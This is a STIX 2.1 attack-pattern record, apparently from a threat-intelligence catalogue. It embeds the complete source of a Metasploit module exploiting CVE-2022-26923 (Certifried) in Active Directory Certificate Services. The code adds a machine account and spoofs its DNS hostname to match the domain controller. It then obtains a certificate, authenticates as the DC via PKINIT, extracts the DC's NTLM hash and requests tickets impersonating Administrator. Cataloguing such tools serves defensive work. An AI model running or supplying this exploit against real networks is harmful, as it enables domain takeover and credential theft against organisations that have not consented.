{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fb5ace11-9cd0-45f8-91f5-f1e59df85da2",
    "created": "2024-08-14T16:22:28.104524Z",
    "modified": "2024-08-14T16:22:28.104529Z",
    "name": "Active Directory Certificate Services (ADCS) privilege escalation (Certifried)",
    "description": " This module exploits a privilege escalation vulnerability in Active Directory Certificate Services (ADCS) to generate a valid certificate impersonating the Domain Controller (DC) computer account. This certificate is then used to authenticate to the target as the DC account using PKINIT preauthentication mechanism. The module will get and cache the Ticket-Granting-Ticket (TGT) for this account along with its NTLM hash. Finally, it requests a TGS impersonating a privileged user (Administrator by default). This TGS can then be used by other modules or external tools.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/dcerpc/cve_2022_26923_certifried.rb",
            "external_id": "cve_2022_26923_certifried.rb"
        },
        {
            "source_name": "reference",
            "url": "https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4"
        },
        {
            "source_name": "reference",
            "url": "https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-26923"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  alias connect_smb_client connect\n\n  include Msf::Exploit::Remote::Kerberos::Client\n\n  include Msf::Exploit::Remote::LDAP\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::MsIcpr\n  include Msf::Exploit::Remote::MsSamr\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Active Directory Certificate Services (ADCS) privilege escalation (Certifried)',\n        'Description' => %q{\n          This module exploits a privilege escalation vulnerability in Active\n          Directory Certificate Services (ADCS) to generate a valid certificate\n          impersonating the Domain Controller (DC) computer account. This\n          certificate is then used to authenticate to the target as the DC\n          account using PKINIT preauthentication mechanism. The module will get\n          and cache the Ticket-Granting-Ticket (TGT) for this account along\n          with its NTLM hash. Finally, it requests a TGS impersonating a\n          privileged user (Administrator by default). This TGS can then be used\n          by other modules or external tools.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Oliver Lyak', # Discovery\n          'CravateRouge', # bloodyAD implementation\n          'Erik Wynter', # MSF module\n          'Christophe De La Fuente' # MSF module\n        ],\n        'References' => [\n          ['URL', 'https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4'],\n          ['URL', 'https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html'],\n          ['CVE', '2022-26923']\n        ],\n        'Notes' => {\n          'AKA' => [ 'Certifried' ],\n          'Reliability' => [],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        },\n        'Actions' => [\n          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate with DNS host name matching the DC' } ],\n          [ 'AUTHENTICATE', { 'Description' => 'Same as REQUEST_CERT but also authenticate' } ],\n          [ 'PRIVESC', { 'Description' => 'Full privilege escalation attack' } ]\n        ],\n        'DefaultAction' => 'PRIVESC',\n        'DefaultOptions' => {\n          'RPORT' => 445,\n          'SSL' => true,\n          'DOMAIN' => ''\n        }\n      )\n    )\n\n    register_options([\n      # Using USERNAME, PASSWORD and DOMAIN options defined by the LDAP mixin\n      OptString.new('DC_NAME', [ true, 'Name of the domain controller being targeted (must match RHOST)' ]),\n      OptInt.new('LDAP_PORT', [true, 'LDAP port (default is 389 and default encrypted is 636)', 636]), # Set to 636 for legacy SSL\n      OptString.new('DOMAIN', [true, 'The Fully Qualified Domain Name (FQDN). Ex: mydomain.local']),\n      OptString.new('USERNAME', [true, 'The username to authenticate with']),\n      OptString.new('PASSWORD', [true, 'The password to authenticate with']),\n      OptString.new(\n        'SPN', [\n          false,\n          'The Service Principal Name used to request an additional impersonated TGS, format is \"service_name/FQDN\" '\\\n          '(e.g. \"ldap/dc01.mydomain.local\"). Note that, independently of this option, a TGS for \"cifs/<DC_NAME>.<DOMAIN>\"'\\\n          ' will always be requested.',\n        ],\n        conditions: %w[ACTION == PRIVESC]\n      ),\n      OptString.new(\n        'IMPERSONATE', [\n          true,\n          'The user on whose behalf a TGS is requested (it will use S4U2Self/S4U2Proxy to request the ticket)',\n          'Administrator'\n        ],\n        conditions: %w[ACTION == PRIVESC]\n      )\n    ])\n\n    deregister_options('CERT_TEMPLATE', 'ALT_DNS', 'ALT_UPN', 'PFX', 'ON_BEHALF_OF', 'SMBUser', 'SMBPass', 'SMBDomain')\n  end\n\n  def run\n    @privesc_success = false\n    @computer_created = false\n\n    opts = {}\n    validate_options\n    unless can_add_computer?\n      fail_with(Failure::NoAccess, 'Machine account quota is zero, this user cannot create a computer account')\n    end\n\n    opts[:tree] = connect_smb\n    computer_info = add_computer(opts)\n    @computer_created = true\n    disconnect_smb(opts.delete(:tree))\n\n    impersonate_dc(computer_info.name)\n\n    opts = {\n      username: computer_info.name,\n      password: computer_info.password\n    }\n    opts[:tree] = connect_smb(opts)\n    opts[:cert_template] = 'Machine'\n    cert = request_certificate(opts)\n    fail_with(Failure::UnexpectedReply, 'Unable to request the certificate.') unless cert\n\n    if ['AUTHENTICATE', 'PRIVESC'].include?(action.name)\n      credential, key = get_tgt(cert)\n      fail_with(Failure::UnexpectedReply, 'Unable to request the TGT.') unless credential && key\n\n      get_ntlm_hash(credential, key)\n    end\n\n    if action.name == 'PRIVESC'\n      # Always request a TGS for `cifs/...` SPN, since we need it to properly delete the computer account\n      default_spn = \"cifs/#{datastore['DC_NAME']}.#{datastore['DOMAIN']}\"\n      request_ticket(credential, default_spn)\n      @privesc_success = true\n\n      # If requested, get an additional TGS\n      if datastore['SPN'].present? && datastore['SPN'].casecmp(default_spn) != 0\n        begin\n          request_ticket(credential, datastore['SPN'])\n        rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e\n          print_error(\"Unable to get the additional TGS for #{datastore['SPN']}: #{e.message}\")\n        end\n      end\n    end\n  rescue MsSamrConnectionError, MsIcprConnectionError => e\n    fail_with(Failure::Unreachable, e.message)\n  rescue MsSamrAuthenticationError, MsIcprAuthenticationError => e\n    fail_with(Failure::NoAccess, e.message)\n  rescue MsSamrNotFoundError, MsIcprNotFoundError => e\n    fail_with(Failure::NotFound, e.message)\n  rescue MsSamrBadConfigError => e\n    fail_with(Failure::BadConfig, e.message)\n  rescue MsSamrUnexpectedReplyError, MsIcprUnexpectedReplyError => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  rescue MsSamrUnknownError, MsIcprUnknownError => e\n    fail_with(Failure::Unknown, e.message)\n  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e\n    fail_with(Failure::Unknown, e.message)\n  ensure\n    if @computer_created\n      print_status(\"Deleting the computer account #{computer_info&.name}\")\n      disconnect_smb(opts.delete(:tree)) if opts[:tree]\n      if @privesc_success\n        # If the privilege escalation succeeded, let'use the cached TGS\n        # impersonating the admin to delete the computer account\n        datastore['SMB::Auth'] = Msf::Exploit::Remote::AuthOption::KERBEROS\n        datastore['Smb::Rhostname'] = \"#{datastore['DC_NAME']}.#{datastore['DOMAIN']}\"\n        datastore['SMBDomain'] = datastore['DOMAIN']\n        datastore['DomainControllerRhost'] = rhost\n        tree = connect_smb(username: datastore['IMPERSONATE'])\n      else\n        tree = connect_smb\n      end\n      opts = {\n        tree: tree,\n        computer_name: computer_info&.name\n      }\n      begin\n        delete_computer(opts) if opts[:tree] && opts[:computer_name]\n      rescue MsSamrUnknownError => e\n        print_warning(\"Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})\")\n      end\n      disconnect_smb(opts.delete(:tree)) if opts[:tree]\n    end\n  end\n\n  def validate_options\n    if datastore['USERNAME'].blank?\n      fail_with(Failure::BadConfig, 'USERNAME not set')\n    end\n    if datastore['PASSWORD'].blank?\n      fail_with(Failure::BadConfig, 'PASSWORD not set')\n    end\n    if datastore['DOMAIN'].blank?\n      fail_with(Failure::BadConfig, 'DOMAIN not set')\n    end\n    unless datastore['DOMAIN'].match(/.+\\..+/)\n      fail_with(Failure::BadConfig, 'DOMAIN format must be FQDN (ex: mydomain.local)')\n    end\n    if datastore['CA'].blank?\n      fail_with(Failure::BadConfig, 'CA not set')\n    end\n    if datastore['DC_NAME'].blank?\n      fail_with(Failure::BadConfig, 'DC_NAME not set')\n    end\n    if datastore['SPN'].present? && !datastore['SPN'].match(%r{.+/.+\\..+\\..+})\n      fail_with(Failure::BadConfig, 'SPN format must be <service_name>/<hostname>.<FQDN> (ex: cifs/dc01.mydomain.local)')\n    end\n  end\n\n  def connect_smb(opts = {})\n    username = opts[:username] || datastore['USERNAME']\n    password = opts[:password] || datastore['PASSWORD']\n    domain = opts[:domain] || datastore['DOMAIN']\n    datastore['SMBUser'] = username\n    datastore['SMBPass'] = password\n    datastore['SMBDomain'] = domain\n\n    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS\n      vprint_status(\"Connecting SMB with #{username}.#{domain} using Kerberos authentication\")\n    else\n      vprint_status(\"Connecting SMB with #{username}.#{domain}:#{password}\")\n    end\n    begin\n      connect_smb_client\n    rescue Rex::ConnectionError, RubySMB::Error::RubySMBError => e\n      fail_with(Failure::Unreachable, e.message)\n    end\n\n    begin\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e\n      fail_with(Failure::NoAccess, \"Unable to authenticate ([#{e.class}] #{e})\")\n    end\n    report_service(\n      host: rhost,\n      port: rport,\n      host_name: simple.client.default_name,\n      proto: 'tcp',\n      name: 'smb',\n      info: \"Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})\"\n    )\n\n    begin\n      simple.client.tree_connect(\"\\\\\\\\#{sock.peerhost}\\\\IPC$\")\n    rescue RubySMB::Error::RubySMBError => e\n      fail_with(Failure::Unreachable, \"Unable to connect to the remote IPC$ share ([#{e.class}] #{e})\")\n    end\n  end\n\n  def disconnect_smb(tree)\n    vprint_status('Disconnecting SMB')\n    tree.disconnect! if tree\n    simple.client.disconnect!\n  rescue RubySMB::Error::RubySMBError => e\n    print_warning(\"Unable to disconnect SMB ([#{e.class}] #{e})\")\n  end\n\n  def can_add_computer?\n    vprint_status('Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...')\n\n    quota = nil\n    begin\n      ldap_open do |ldap|\n        ldap_options = {\n          filter: Net::LDAP::Filter.eq('objectclass', 'domainDNS'),\n          attributes: 'ms-DS-MachineAccountQuota',\n          return_result: false\n        }\n        ldap.search(ldap_options) do |entry|\n          quota = entry['ms-ds-machineaccountquota']&.first&.to_i\n        end\n      end\n    rescue Net::LDAP::Error => e\n      print_error(\"LDAP error: #{e.class}: #{e.message}\")\n    end\n\n    if quota.blank?\n      print_warning('Received no result when trying to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.')\n      return true\n    end\n\n    vprint_status(\"ms-DS-MachineAccountQuota = #{quota}\")\n    quota > 0\n  end\n\n  def print_ldap_error(ldap)\n    opres = ldap.get_operation_result\n    msg = \"LDAP error #{opres.code}: #{opres.message}\"\n    unless opres.error_message.to_s.empty?\n      msg += \" - #{opres.error_message}\"\n    end\n    print_error(\"#{peer} #{msg}\")\n  end\n\n  def ldap_open\n    ldap_peer = \"#{rhost}:#{datastore['LDAP_PORT']}\"\n    base = datastore['DOMAIN'].split('.').map { |dc| \"dc=#{dc}\" }.join(',')\n    ldap_options = {\n      port: datastore['LDAP_PORT'],\n      base: base\n    }\n\n    ldap_connect(ldap_options) do |ldap|\n      if ldap.get_operation_result.code != 0\n        print_ldap_error(ldap)\n        break\n      end\n      print_good(\"Successfully authenticated to LDAP (#{ldap_peer})\")\n      yield ldap\n    end\n  end\n\n  def get_dnshostname(ldap, c_name)\n    dnshostname = nil\n    filter1 = Net::LDAP::Filter.eq('Name', c_name.delete_suffix('$'))\n    filter2 = Net::LDAP::Filter.eq('objectclass', 'computer')\n    joined_filter = Net::LDAP::Filter.join(filter1, filter2)\n    ldap_options = {\n      filter: joined_filter,\n      attributes: 'DNSHostname',\n      return_result: false\n\n    }\n    ldap.search(ldap_options) do |entry|\n      dnshostname = entry[:dnshostname]&.first\n    end\n    vprint_status(\"Retrieved original DNSHostame #{dnshostname} for #{c_name}\") if dnshostname\n    dnshostname\n  end\n\n  def impersonate_dc(computer_name)\n    ldap_open do |ldap|\n      dc_dnshostname = get_dnshostname(ldap, datastore['DC_NAME'])\n      print_status(\"Attempting to set the DNS hostname for the computer #{computer_name} to the DNS hostname for the DC: #{datastore['DC_NAME']}\")\n      domain_to_ldif = datastore['DOMAIN'].split('.').map { |dc| \"dc=#{dc}\" }.join(',')\n      computer_dn = \"cn=#{computer_name.delete_suffix('$')},cn=computers,#{domain_to_ldif}\"\n      ldap.modify(dn: computer_dn, operations: [[ :add, :dnsHostName, dc_dnshostname ]])\n      new_computer_hostname = get_dnshostname(ldap, computer_name)\n      if new_computer_hostname != dc_dnshostname\n        fail_with(Failure::Unknown, 'Failed to change the DNS hostname')\n      end\n      print_good('Successfully changed the DNS hostname')\n    end\n  rescue Net::LDAP::Error => e\n    print_error(\"LDAP error: #{e.class}: #{e.message}\")\n  end\n\n  def get_tgt(cert)\n    dc_name = datastore['DC_NAME'].dup.downcase\n    dc_name += '$' unless dc_name.ends_with?('$')\n    username, realm = extract_user_and_realm(cert.certificate, dc_name, datastore['DOMAIN'])\n    print_status(\"Attempting PKINIT login for #{username}@#{realm}\")\n    begin\n      server_name = \"krbtgt/#{realm}\"\n      tgt_result = send_request_tgt_pkinit(\n        pfx: cert,\n        client_name: username,\n        realm: realm,\n        server_name: server_name,\n        rport: 88\n      )\n      print_good('Successfully authenticated with certificate')\n\n      report_service(\n        host: rhost,\n        port: rport,\n        name: 'Kerberos-PKINIT',\n        proto: 'tcp',\n        info: \"Module: #{fullname}, Realm: #{realm}\"\n      )\n\n      ccache = Rex::Proto::Kerberos::CredentialCache::Krb5Ccache.from_responses(tgt_result.as_rep, tgt_result.decrypted_part)\n      Msf::Exploit::Remote::Kerberos::Ticket::Storage.store_ccache(ccache, host: rhost, framework_module: self)\n\n      [ccache.credentials.first, tgt_result.krb_enc_key[:key]]\n    rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e\n      case e.error_code\n      when Rex::Proto::Kerberos::Model::Error::ErrorCodes::KDC_ERR_CERTIFICATE_MISMATCH\n        print_error(\"Failed: #{e.message}, Target system is likely not vulnerable to Certifried\")\n      else\n        print_error(\"Failed: #{e.message}\")\n      end\n      nil\n    end\n  end\n\n  def get_ntlm_hash(credential, key)\n    dc_name = datastore['DC_NAME'].dup.downcase\n    dc_name += '$' unless dc_name.ends_with?('$')\n    print_status(\"Trying to retrieve NT hash for #{dc_name}\")\n\n    realm = datastore['DOMAIN'].downcase\n\n    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(\n      host: rhost,\n      realm: realm,\n      username: dc_name,\n      framework: framework,\n      framework_module: self\n    )\n    tgs_ticket, _tgs_auth = authenticator.u2uself(credential)\n\n    session_key = Rex::Proto::Kerberos::Model::EncryptionKey.new(\n      type: credential.keyblock.enctype.value,\n      value: credential.keyblock.data.value\n    )\n    ticket_enc_part = Rex::Proto::Kerberos::Model::TicketEncPart.decode(\n      tgs_ticket.enc_part.decrypt_asn1(session_key.value, Rex::Proto::Kerberos::Crypto::KeyUsage::KDC_REP_TICKET)\n    )\n    value = OpenSSL::ASN1.decode(ticket_enc_part.authorization_data.elements[0][:data]).value[0].value[1].value[0].value\n    pac = Rex::Proto::Kerberos::Pac::Krb5Pac.read(value)\n    pac_info_buffer = pac.pac_info_buffers.find do |buffer|\n      buffer.ul_type == Rex::Proto::Kerberos::Pac::Krb5PacElementType::CREDENTIAL_INFORMATION\n    end\n    unless pac_info_buffer\n      print_error('NTLM hash not found in PAC')\n      return\n    end\n\n    serialized_pac_credential_data = pac_info_buffer.buffer.pac_element.decrypt_serialized_data(key)\n    ntlm_hash = serialized_pac_credential_data.data.extract_ntlm_hash\n    print_good(\"Found NTLM hash for #{dc_name}: #{ntlm_hash}\")\n    report_ntlm(realm, dc_name, ntlm_hash)\n  end\n\n  def report_ntlm(domain, user, hash)\n    jtr_format = Metasploit::Framework::Hashes.identify_hash(hash)\n    service_data = {\n      address: rhost,\n      port: rport,\n      service_name: 'smb',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      module_fullname: fullname,\n      origin_type: :service,\n      private_data: hash,\n      private_type: :ntlm_hash,\n      jtr_format: jtr_format,\n      username: user,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: domain\n    }.merge(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def request_ticket(credential, spn)\n    print_status(\"Getting TGS impersonating #{datastore['IMPERSONATE']}@#{datastore['DOMAIN']} (SPN: #{spn})\")\n\n    dc_name = datastore['DC_NAME'].dup.downcase\n    dc_name += '$' if !dc_name.ends_with?('$')\n\n    options = {\n      host: rhost,\n      realm: datastore['DOMAIN'],\n      username: dc_name,\n      framework: framework,\n      framework_module: self\n    }\n\n    authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(**options)\n\n    sname = Rex::Proto::Kerberos::Model::PrincipalName.new(\n      name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,\n      name_string: spn.split('/')\n    )\n    auth_options = {\n      sname: sname,\n      impersonate: datastore['IMPERSONATE']\n    }\n    authenticator.s4u2self(credential, auth_options)\n  end\n\nend\n"
}